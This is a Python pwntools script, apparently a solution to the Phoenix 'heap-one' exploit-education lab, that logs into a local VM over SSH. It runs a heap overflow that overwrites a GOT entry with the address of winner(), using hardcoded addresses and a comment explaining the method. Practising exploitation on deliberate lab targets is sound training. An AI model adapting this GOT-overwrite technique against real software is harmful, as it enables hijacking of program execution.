#!/usr/bin/python
from pwn import *
s = ssh(user='user', host='localhost', password='user', port=2222)
#s.interactive()
'''
this time 2 arguments are taken in and aren't checked for length
so running aaaabbbbccccddddeeeeffff
we see that ffff is stored on the stack in the 2nd and 4th position
the first argument where 'ffff' will be the address of the GOT
which we can rewrite to be the address in the second argument
to the address of winner so when puts is called it instead executes
winner()
'''
got=0x804c140
winner=0x804889a
exploit='/opt/phoenix/i486/heap-one '
exploit+='$(python -c \'print "a"*20+"'
exploit+=p32(got)
exploit+='"\') $(python -c \'print "'
exploit+=p32(winner)
exploit+='"\')'
print(s[exploit])
s.close()
